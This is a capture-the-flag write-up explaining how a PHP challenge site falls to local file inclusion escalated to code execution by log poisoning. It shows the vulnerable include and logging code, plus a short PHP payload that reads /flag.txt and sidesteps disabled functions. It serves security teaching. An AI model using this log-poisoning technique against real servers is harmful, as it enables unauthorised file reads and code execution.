# WHO IS JH

tl;dr
- LFI to RCE in PHP with Log Poisoning

## Solution

In this challenge, participants are provided with the source code of a website built using PHP.

<img width="1680" alt="image" src="https://github.com/user-attachments/assets/a97e9be2-162b-4b66-8342-e066db36e6e8" />

Look at the `Dockerfile` source code, the flag is located in `/flag.txt` and it only runs a standard web server with several disabled functions.

```
FROM php:8.1-apache

COPY src/ /var/www/html/
COPY flag.txt /flag.txt

RUN mkdir -p /var/www/html/uploads && \
    chown -R www-data:www-data /var/www/html/uploads && \
    chmod -R 755 /var/www/html/uploads

COPY apache-config.conf /etc/apache2/sites-available/000-default.conf

RUN echo "disable_functions = exec,system,shell_exec,passthru,popen,proc_open" > /usr/local/etc/php/php.ini

EXPOSE 80

CMD ["apache2-foreground"]
```


The vulnerability lies in `conspiracy.php`, below the source code:

`conspiracy.php`
```php
<?php
require_once 'log.php';

$baseDir = realpath('/var/www/html');

$language = $_GET['language'] ?? 'languages/english.php';

logEvent("Language parameter accessed: $language");

$filePath = realpath($language);

ob_start();

if ($filePath && strpos($filePath, $baseDir) === 0 && file_exists($filePath)) {
    include($filePath);
} else {
    echo "<p>File not found or access denied: " . htmlspecialchars($language) . "</p>";
    logEvent("Access denied or file not found for: $language");
}
$languageContent = ob_get_clean();
?>
```

The website takes the `language` GET parameter and log the value using `logEvent()` function.

`log.php`
```php
<?php
$logFile = 'logs/site_log.txt';

/**
 * Logs a message to the centralized log file.
 *
 * @param string $message The message to log.
 */
function logEvent($message) {
    global $logFile;

    if (!is_dir(dirname($logFile))) {
        mkdir(dirname($logFile), 0755, true);
    }

    $timestamp = date('[Y-m-d H:i:s]');
    $formattedMessage = "$timestamp $message\n";

    file_put_contents($logFile, $formattedMessage, FILE_APPEND);
}
```

The `logEvent()` function saves the value in logs/site_log.txt. Since the `language` parameter lacks validation or sanitization, we can inject malicious PHP code to poison the log.

Below the payload to read the flag using `readfile()` function to bypass the disabled functions:

```php
<?php echo readfile('/flag.txt');?>
```

<img width="1026" alt="image" src="https://github.com/user-attachments/assets/69a11f81-f747-47de-b4b6-401c5bae4189" />

After poison the log with PHP payload, we can load the payload using `include()` function in

```php
if ($filePath && strpos($filePath, $baseDir) === 0 && file_exists($filePath)) {
    include($filePath);
}
```

<img width="1680" alt="image" src="https://github.com/user-attachments/assets/d3189d89-863f-4e99-9f4a-98653025b6bd" />
